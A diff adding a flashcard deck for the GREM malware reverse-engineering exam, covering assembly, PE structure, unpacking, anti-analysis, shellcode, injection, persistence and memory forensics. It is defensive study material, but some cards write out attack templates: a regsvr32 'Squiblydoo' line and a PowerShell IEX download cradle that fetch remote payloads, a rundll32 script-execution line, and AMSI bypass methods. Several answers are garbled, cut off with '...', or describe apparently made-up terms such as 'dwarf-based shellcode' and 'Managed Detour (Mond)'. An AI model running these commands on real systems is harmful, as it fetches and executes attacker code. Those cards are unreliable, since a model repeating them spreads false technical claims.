@@ -1,0 +1,403 @@
+title: GREM
+description: GIAC Reverse Engineering Malware — assembly, PE format, packers, shellcode, anti-analysis, malware behavior
+cards:
+- question: What is the EAX register used for?
+  answer: Accumulator — function return value, arithmetic operations
+- question: What is the EBX register used for?
+  answer: Base — often used as a pointer to data in DS segment
+- question: What is the ECX register used for?
+  answer: Counter — used in loops (rep, loop instructions)
+- question: What is the EDX register used for?
+  answer: Data — I/O operations, multiply/divide extension
+- question: What is the ESI register used for?
+  answer: Source Index — source pointer for string operations
+- question: What is the EDI register used for?
+  answer: Destination Index — destination pointer for string operations
+- question: What is the EBP register used for?
+  answer: Base Pointer — points to the stack frame base for function calls
+- question: What is the ESP register used for?
+  answer: Stack Pointer — points to the top of the stack
+- question: What is the EIP register used for?
+  answer: Instruction Pointer — points to the next instruction to execute
+- question: What does the PUSH instruction do?
+  answer: Decrements ESP and stores the operand at the new stack top
+- question: What does the POP instruction do?
+  answer: Loads data from stack top into operand and increments ESP
+- question: What does the CALL instruction do?
+  answer: Pushes return address (EIP+5) onto stack and jumps to target address
+- question: What does the RET instruction do?
+  answer: Pops return address from stack and jumps to it
+- question: What does the JMP instruction do?
+  answer: Unconditionally jumps to a target address
+- question: What does the CMP instruction do?
+  answer: Compares two operands by subtraction, sets flags (ZF, CF, SF, OF)
+- question: What does the TEST instruction do?
+  answer: Performs AND operation without storing result, sets flags (ZF if zero)
+- question: What is the stdcall calling convention?
+  answer: Arguments pushed right-to-left; callee cleans stack (ret n)
+- question: What is the cdecl calling convention?
+  answer: Arguments pushed right-to-left; caller cleans stack
+- question: What is the fastcall calling convention?
+  answer: First two arguments passed in ECX and EDX; rest on stack, callee cleans
+- question: What is the x64 calling convention (Windows)?
+  answer: First 4 args in RCX, RDX, R8, R9; rest on stack; caller allocates shadow space
+- question: What is a function prologue?
+  answer: push ebp; mov ebp, esp; sub esp, N
+- question: What is a function epilogue?
+  answer: mov esp, ebp; pop ebp; ret N
+- question: What is the DOS header at offset 0 in a PE file?
+  answer: IMAGE_DOS_HEADER — starts with 'MZ' magic bytes (0x4D 0x5A)
+- question: What field in IMAGE_DOS_HEADER points to the PE header?
+  answer: e_lfanew (offset 0x3C)
+- question: What is the PE signature?
+  answer: '''PE\0\0'' (0x50 0x45 0x00 0x00) at offset from e_lfanew'
+- question: What does IMAGE_FILE_HEADER contain?
+  answer: Machine type, number of sections, timestamp, symbol table info, characteristics
+- question: What does IMAGE_OPTIONAL_HEADER contain?
+  answer: Magic, entry point, image base, section alignment, file alignment, subsystem, DLL...
+- question: What is the IMAGE_DATA_DIRECTORY?
+  answer: 'Array of IMAGE_DATA_DIRECTORY_ENTRY fields (64-bit: 16 entries; 32-bit: 16 entries)'
+- question: What are the common PE sections?
+  answer: .text, .data, .rdata, .rsrc, .reloc
+- question: What does the IAT (Import Address Table) contain?
+  answer: Addresses of imported functions, resolved by the loader at runtime
+- question: What is the IDT (Import Directory Table)?
+  answer: Array of IMAGE_IMPORT_DESCRIPTOR structures, one per imported DLL
+- question: What does IMAGE_IMPORT_DESCRIPTOR contain?
+  answer: OriginalFirstThunk (OFT), TimeDateStamp, ForwarderChain, Name (DLL name RVA), FirstThunk (IAT)
+- question: What is the INT (Import Name Table)?
+  answer: Points to IMAGE_THUNK_DATA array with original function names/ordinals (before binding)
+- question: What is TLS (Thread Local Storage) in PE?
+  answer: IMAGE_TLS_DIRECTORY structure that stores per-thread initialized data; TLS callbacks...
+- question: What is TLS callback abuse?
+  answer: Malware uses TLS callbacks to execute code before the main entry point OEP
+- question: What is the base relocation table?
+  answer: .reloc section; contains IMAGE_BASE_RELOCATION blocks adjusting addresses if DLL is not...
+- question: What is a relative virtual address (RVA)?
+  answer: Address relative to the image base; PhysicalAddress = RVA - section_base + section_raw_offset
+- question: How is an RVA converted to a file offset?
+  answer: Find the section containing the RVA; offset = RVA - section.VirtualAddress +...
+- question: What is the entry point field in the optional header?
+  answer: AddressOfEntryPoint (RVA of initial code)
+- question: What is the ImageBase field?
+  answer: Preferred load address for the PE (usually 0x00400000 for executables, 0x10000000 for DLLs)
+- question: What is the SectionAlignment field?
+  answer: Alignment of sections in memory (typically 0x1000 for PE32)
+- question: What is the FileAlignment field?
+  answer: Alignment of sections in file (typically 0x200 for PE32)
+- question: What is the IMAGE_NT_HEADERS structure?
+  answer: Signature + IMAGE_FILE_HEADER + IMAGE_OPTIONAL_HEADER
+- question: What does the SizeOfImage field represent?
+  answer: Total size of the image when loaded in memory
+- question: What does SizeOfCode represent?
+  answer: Size of the code (.text) section
+- question: What does SizeOfInitializedData represent?
+  answer: Size of initialized data sections (.data, .rdata)
+- question: What does SizeOfUninitializedData represent?
+  answer: Size of uninitialized data sections (.bss)
+- question: What is a packed binary?
+  answer: A compressed/encrypted executable that decompresses at runtime via a stub
+- question: What is the first step in unpacking?
+  answer: Find the Original Entry Point (OEP)
+- question: What technique finds OEP via stack?
+  answer: Set a breakpoint after the pushad (push all); after popad (pop all), step to OEP
+- question: What technique finds OEP via memory breakpoint?
+  answer: Set hardware breakpoint on .text section after unpacking completes
+- question: What is UPX?
+  answer: Ultimate Packer for eXecutables — common free packer
+- question: How do you unpack a UPX binary manually?
+  answer: Single step through UPX stub until ESP points to OEP (PE header trick)
+- question: What command unpacks UPX from command line?
+  answer: upx -d packed.exe
+- question: What is Themida?
+  answer: Commercial software protector with anti-debug, anti-dump, virtual machine
+- question: What is VMProtect?
+  answer: Commercial protector that translates code to virtualized bytecode
+- question: What is import reconstruction?
+  answer: Rebuilding the IAT after unpacking by finding original API calls
+- question: What tool reconstructs imports for unpacked binaries?
+  answer: Import Reconstructor (ImpRec) or Scylla
+- question: What is IsDebuggerPresent?
+  answer: Windows API (kernel32) that checks the PEB BeingDebugged flag
+- question: How does IsDebuggerPresent work?
+  answer: Reads TEB → PEB → BeingDebugged byte (offset 0x02)
+- question: What is NtGlobalFlag?
+  answer: A flag in the PEB (offset 0x68 on x86) checked by anti-debug techniques
+- question: What is NtQueryInformationProcess?
+  answer: NTAPI function that can query if a debugger is attached
+- question: What is the OutputDebugString anti-debug trick?
+  answer: Calling OutputDebugString and checking GetLastError for a specific value
+- question: What is the INT3 (0xCC) anti-debug?
+  answer: Inserting 0xCC bytes; if they are replaced or step over, detect debugger presence
+- question: What is the timing check anti-debug?
+  answer: Using rdtsc, QueryPerformanceCounter, or GetTickCount to detect slowdown from debugging
+- question: What does RDTSC do?
+  answer: Reads Time-Stamp Counter; difference between two readings reveals debugger-induced slowdown
+- question: What is the hardware breakpoint detection?
+  answer: Check DR0-DR7 debug registers via exception handler or thread context
+- question: What is the self-debugging anti-analysis?
+  answer: Process attaches as its own debugger, preventing another debugger from attaching
+- question: What is anti-VM via red pill?
+  answer: Checking for VM-specific instructions or artifacts
+- question: What CPUID leaf checks for hypervisor?
+  answer: CPUID with EAX=1; ECX bit 31 indicates hypervisor presence
+- question: What is the 'backdoor' instruction (VM)?
+  answer: IN / OUT port 0x5658 (VMware), 'VMXh' magic value in EAX
+- question: What registry checks detect VMware?
+  answer: HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum and HKLM\SOFTWARE\VMware\*
+- question: What MAC OUI identifies VMware?
+  answer: 00:50:56, 00:05:69, 00:0C:29
+- question: What MAC OUI identifies VirtualBox?
+  answer: 08:00:27
+- question: What process names indicate virtual machines?
+  answer: vmtoolsd.exe, VBoxService.exe, VBoxTray.exe, xenservice.exe
+- question: What is anti-disassembly via opaque predicates?
+  answer: A condition that is always true/false but hard to analyze statically, hiding real code
+- question: What is anti-disassembly via overlapping instructions?
+  answer: Jumping into the middle of an instruction to execute different code than what disassembler...
+- question: What is position-independent code (PIC)?
+  answer: Shellcode that can run from any memory address without relocation
+- question: What is the call/pop GetPC technique?
+  answer: call $+5; pop reg — CALL pushes return address, POP gets the current address
+- question: What is the fnstenv GetPC technique?
+  answer: Use FNSTENV to save FPU state and extract the return address from the saved state
+- question: How does shellcode resolve API addresses?
+  answer: Walk PEB → PEB_LDR_DATA → InMemoryOrderModuleList → module base → export directory
+- question: What is PEB structure walking?
+  answer: Locate PEB via FS:[0x30] on x86 or GS:[0x60] on x64; traverse loaded modules to find kernel32
+- question: What is API hashing in shellcode?
+  answer: Computing a hash of API function name and comparing to find the function without storing names
+- question: What is alphanumeric shellcode?
+  answer: Shellcode using only printable ASCII characters (0x20-0x7F)
+- question: What decoder is used for alphanumeric shellcode?
+  answer: A self-modifying encoder that produces alphanumeric output (e.g., alpha2 encoder)
+- question: What is dwarf-based shellcode?
+  answer: Shellcode specifically built to run in constrained environments with limited available bytes
+- question: What is Volatility?
+  answer: Advanced memory forensics framework for analyzing RAM dumps
+- question: What Volatility command lists running processes?
+  answer: vol -f dump.mem windows.pslist
+- question: What Volatility command finds hidden processes?
+  answer: vol -f dump.mem windows.psscan
+- question: What Volatility command shows process tree?
+  answer: vol -f dump.mem windows.pstree
+- question: What Volatility command lists DLLs?
+  answer: vol -f dump.mem windows.dlllist
+- question: What Volatility command finds injected code?
+  answer: vol -f dump.mem windows.malfind
+- question: What Volatility command detects API hooks?
+  answer: vol -f dump.mem windows.apihooks
+- question: What Volatility command checks SSDT hooks?
+  answer: vol -f dump.mem windows.ssdt
+- question: What Volatility command dumps executable from memory?
+  answer: windows.memmap.Memmap / windows.dlldump.DllDump, windows.procdump.Procdump
+- question: What Volatility command extracts network connections?
+  answer: vol -f dump.mem windows.netscan
+- question: What Volatility command shows cmd history?
+  answer: vol -f dump.mem windows.cmdline or windows.cmdscan
+- question: What Volatility command extracts console input/output?
+  answer: vol -f dump.mem windows.consoles
+- question: What Volatility command extracts registry data?
+  answer: vol -f dump.mem windows.hivelist; windows.printkey -K '...'
+- question: What Volatility plugin scans for mutexes?
+  answer: vol -f dump.mem windows.mutantscan
+- question: What is process hollowing?
+  answer: Creating a process in suspended state, unmapping its original code, writing malicious code,...
+- question: How do you detect process hollowing?
+  answer: Malfind detects anonymous mapped memory with RX permissions; Psscan reveals offset VAD...
+- question: What is DLL injection?
+  answer: Loading a malicious DLL into a target process via CreateRemoteThread and LoadLibrary
+- question: What is reflective DLL injection?
+  answer: Loading a DLL from memory without using LoadLibrary, bypassing standard DLL loading
+- question: What is APC injection?
+  answer: Queuing an Asynchronous Procedure Call to a thread's APC queue to execute shellcode
+- question: What is thread execution hijacking?
+  answer: Setting a thread's context (instruction pointer) to point to shellcode
+- question: What are common malware persistence mechanisms?
+  answer: Registry Run keys, Scheduled Tasks, Services, Startup folder, WMI Event Subscription, DLL...
+- question: What registry Run key starts on boot?
+  answer: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+- question: What registry RunOnce key starts once?
+  answer: HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+- question: What is AppInit_DLLs?
+  answer: DLLs loaded into every process that loads User32.dll
+- question: What is a bootkit?
+  answer: Malware that infects the Master Boot Record (MBR) or Volume Boot Record (VBR)
+- question: What is a rootkit?
+  answer: Malware that hides its presence by hooking system APIs or kernel data structures
+- question: What is a kernel-mode rootkit?
+  answer: Runs in ring 0, hooks SSDT, IDT, or IRP dispatch to hide files/processes/registry
+- question: What is an SSDT hook?
+  answer: Hooking the System Service Descriptor Table to intercept kernel calls
+- question: What is an IDT hook?
+  answer: Hooking the Interrupt Descriptor Table entry to intercept interrupts
+- question: What is an IRP hook?
+  answer: Hooking the I/O Request Packet dispatch function in a device driver to filter I/O
+- question: What is an inline hook?
+  answer: Overwriting the first bytes of a function with a JMP to malicious code
+- question: What is a detour hook?
+  answer: Redirecting a function's entry point to a trampoline -> attacker function -> original function
+- question: What does Windows Prefetch contain?
+  answer: Application startup information including last execution time, run count, and loaded DLLs
+- question: What is ShimCache (AppCompatCache)?
+  answer: Registry cache that tracks application execution (binary path, last modified time)
+- question: What is AmCache?
+  answer: Registry hive storing execution history of applications
+- question: What is Sysmon?
+  answer: System Monitor — Windows system service that logs process creation, network connections,...
+- question: What Sysmon Event ID 1 logs?
+  answer: Process creation (command line, parent process, process GUID)
+- question: What Sysmon Event ID 3 logs?
+  answer: Network connection (source IP, destination IP, port, process)
+- question: What Sysmon Event ID 7 logs?
+  answer: Image loaded (DLL loaded into a process)
+- question: What Sysmon Event ID 8 logs?
+  answer: CreateRemoteThread (potential code injection)
+- question: What Sysmon Event ID 10 logs?
+  answer: Process access (access to another process via OpenProcess)
+- question: What Sysmon Event ID 11 logs?
+  answer: File creation (new file or overwrite)
+- question: What Sysmon Event ID 13 logs?
+  answer: Registry value set (write to registry)
+- question: What Sysmon Event ID 15 logs?
+  answer: FileCreateStreamHash (NTFS alternate data stream)
+- question: What Sysmon Event ID 22 logs?
+  answer: DNS query (name, IP, process)
+- question: What is YARA?
+  answer: Pattern-matching tool for identifying malware by strings, byte sequences, and metadata
+- question: What is a YARA rule structure?
+  answer: 'rule name { meta: ... strings: $a = { hex } condition: $a }'
+- question: What YARA keyword matches any of two strings?
+  answer: 'condition: $a or $b'
+- question: What YARA keyword matches all strings?
+  answer: 'condition: all of them'
+- question: What YARA keyword matches at least N strings?
+  answer: 'condition: #a > N or N of ($a, $b, $c)'
+- question: How do you write a YARA wide string?
+  answer: $a = "text" wide
+- question: What YARA modifier matches full word?
+  answer: fullword
+- question: What YARA condition matches file offset?
+  answer: '@a < 0x1000 (file offset of match $a is less than 4KB)'
+- question: How does C2 HTTP traffic get detected?
+  answer: Unusual user-agent, periodic beacons, non-standard headers, encrypted content, domain...
+- question: What is a Domain Generation Algorithm (DGA)?
+  answer: Algorithm to generate many domain names for C2, used to evade domain blocklists
+- question: What is DNS tunneling?
+  answer: Encoding data in DNS queries/responses to exfiltrate data or establish C2
+- question: What JA3 fingerprint identifies?
+  answer: SSL/TLS client fingerprint based on Client Hello parameters (cipher suites, extensions, curves)
+- question: What is a C2 callback?
+  answer: Beacon from infected host to C2 server, typically HTTP/HTTPS/DNS
+- question: What is data exfiltration?
+  answer: Unauthorized copying of data from a compromised system to external infrastructure
+- question: What is dnSpy used for?
+  answer: .NET assembly debugger and decompiler for analyzing managed code
+- question: What is de4dot used for?
+  answer: .NET deobfuscator and unpacker
+- question: What obfuscator is ConfuserEx?
+  answer: Open-source .NET obfuscator with rename, control flow, constants, etc.
+- question: What is OLE (Object Linking and Embedding)?
+  answer: A compound document format used in Office files; malware often hides in macros (VBA)
+- question: What is VBA stomping?
+  answer: Replacing VBA source code with compiled p-code while leaving the original source appearing...
+- question: What is XLM/Excel 4.0 macro?
+  answer: Legacy Excel macro language still supported; used for fileless malware
+- question: What is HTA (HTML Application)?
+  answer: HTML with extended capabilities that runs with mshta.exe
+- question: What does mshta.exe load?
+  answer: HTA files (can contain VBScript/JavaScript executed via mshta)
+- question: What does rundll32.exe execute?
+  answer: DLL entry points (e.g., rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication" ...)
+- question: What does regsvr32.exe load?
+  answer: 'COM DLLs (Squiblydoo: regsvr32 /s /n /u /i:http://server/payload.sct scrobj.dll)'
+- question: What is AMSI?
+  answer: Anti-Malware Scan Interface — scans PowerShell and other scripts for malicious content
+- question: How can AMSI be bypassed?
+  answer: Patching AmsiScanBuffer in memory, registry disable, or using reflection
+- question: What PowerShell feature enables constraining mode?
+  answer: Constrained Language Mode restricts non-core types; bypass via environment variable or...
+- question: What is a PE resource (.rsrc)?
+  answer: Binary resources embedded in a PE file — icons, strings, dialogs, but also encrypted payloads
+- question: What tool extracts resources from PE files?
+  answer: Resource Hacker, 7-zip, or Python pefile
+- question: What is process doppelgänging?
+  answer: Loading a malicious executable into memory via NTFS transactional NTFS (TxF)
+- question: How does process doppelgänging differ from hollowing?
+  answer: Doppelgänging uses TxF to replace the file on disk within a transaction; hollowing unmaps...
+- question: What is the kernel32 PEB offset on x86?
+  answer: PEB is at FS:[0x30]; PEB_LDR_DATA is at offset 0x0C
+- question: What is the kernel32 PEB offset on x64?
+  answer: PEB is at GS:[0x60]; InMemoryOrderModuleList at offset 0x10
+- question: What is a MZ header?
+  answer: DOS MZ executable header (magic bytes 0x4D 0x5A), the first 64 bytes of a PE file
+- question: What can OLEObject in RTF indicate?
+  answer: Embedded malicious files in Rich Text Format documents
+- question: What tool extracts OLE objects from Office files?
+  answer: oledump.py or 7-zip
+- question: What is the PE checksum field?
+  answer: IMAGE_OPTIONAL_HEADER.CheckSum — file integrity checksum
+- question: What tool views PE structure in detail?
+  answer: PE-bear, CFF Explorer, or binary reader + Python pefile
+- question: What is Export Address Table (EAT)?
+  answer: Table in PE exports (.edata section) listing exported function addresses, names, ordinals
+- question: What is an ordinal export?
+  answer: Export identified by a number rather than a name string
+- question: What is delayed DLL loading?
+  answer: DLL is loaded only when its first function is called, via delay-load import descriptors
+- question: What is bound import?
+  answer: IAT is pre-bound to specific DLL versions; loader compares timestamp to skip resolution
+- question: What tool monitors process activity for malware analysis?
+  answer: Process Monitor (procmon), Process Explorer, API Monitor
+- question: What tool captures network traffic for malware analysis?
+  answer: Wireshark, tcpdump, Fiddler, mitmproxy
+- question: What is the typical order of Windows API hooking detection?
+  answer: Check userland hooks via DLL integrity, check inline hooks, check SSDT hooks, check IRP hooks
+- question: What does 'SIGNATURE_CHECK FAILED' indicate in Process Explorer?
+  answer: A DLL or driver's digital signature is invalid, indicating potential rootkit
+- question: What is the PEB_LDR_DATA structure?
+  answer: PEB member containing loaded module list
+- question: What is the EAT (Export Address Table) structure?
+  answer: 'IMAGE_EXPORT_DIRECTORY: Characteristics, TimeDateStamp, MajorVersion, MinorVersion, Name,...'
+- question: What is the .tls section in PE?
+  answer: Thread Local Storage section — contains TLS template data and callbacks
+- question: What is the IMAGE_TLS_DIRECTORY32?
+  answer: StartAddressOfRawData, EndAddressOfRawData, AddressOfIndex, AddressOfCallBacks,...
+- question: What is the .reloc section purpose?
+  answer: Contains base relocation table to fix absolute addresses if DLL is loaded at a different base
+- question: What is the IMAGE_BASE_RELOCATION structure?
+  answer: VirtualAddress, SizeOfBlock, TypeOffset entries
+- question: What is IMAGE_REL_BASED_HIGHLOW?
+  answer: 'Relocation type 3: apply delta to 32-bit field at offset'
+- question: What is IMAGE_REL_BASED_DIR64?
+  answer: 'Relocation type 10 (0xA): apply delta to 64-bit field'
+- question: What is .NET metadata in PE?
+  answer: IMAGE_COR20_HEADER in .text section for .NET assemblies
+- question: What is the CLR header?
+  answer: CLR runtime header containing entry point, metadata, resources, strong name
+- question: What is dnlib?
+  answer: .NET assembly reading/writing library for analyzing managed binaries
+- question: What is Managed Detour (Mond)?
+  answer: Runtime method redirection for .NET — like hooks for managed code
+- question: What is the .NET garbage collector (GC)?
+  answer: Automatic memory management in .NET — marks, sweeps, compacts heap
+- question: What is JIT (Just-In-Time) compilation?
+  answer: .NET IL code compiled to native code at runtime by the JIT compiler
+- question: What is NGen?
+  answer: Native Image Generator — pre-JITs .NET assemblies to native code
+- question: What is IL (Intermediate Language)?
+  answer: .NET bytecode — generated from source, JIT compiled to native
+- question: What are managed heap segments?
+  answer: .NET heap divided into Gen0, Gen1, Gen2 and Large Object Heap (LOH)
+- question: What is a managed stack trace?
+  answer: Call stack with IL offsets and method metadata — useful for debugging malware
+- question: What is a PowerShell download cradle?
+  answer: IEX (New-Object Net.WebClient).DownloadString('http://...')
+- question: What is the Windows.ExploitGuard config?
+  answer: Windows Defender Exploit Guard — Attack Surface Reduction, network protection, controlled...
+- question: What is EMET (Enhanced Mitigation Experience Toolkit)?
+  answer: Microsoft security tool with DEP, ASLR, SEHOP, EAF — superseded by Exploit Guard
+- question: What is the Windows SChannel?
+  answer: Security Support Provider for SSL/TLS - can be hooked for SSL traffic interception
+- question: What is the Windows RtlCompareMemory function?
+  answer: Memory comparison - malware may use instead of memcmp to evade signature detection
